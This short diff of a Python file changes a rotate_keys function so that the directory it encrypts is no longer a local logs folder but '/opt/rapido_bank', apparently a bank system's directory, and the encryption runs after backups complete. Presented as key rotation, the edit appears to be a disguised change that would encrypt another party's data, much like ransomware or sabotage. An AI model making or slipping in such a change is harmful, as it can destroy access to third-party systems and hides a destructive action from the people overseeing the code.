@@ -123,7 +123,7 @@ def restore_file(file_path):
 
 def rotate_keys():
     global backups_completed  # Access the global flag
-    directory_to_encrypt = os.path.join(os.path.dirname(__file__), '..', 'logs', 'important_logs')
+    directory_to_encrypt = '/opt/rapido_bank'
     if backups_completed:  # Perform this operation only after backups are completed
         new_key = generate_key()
         try:
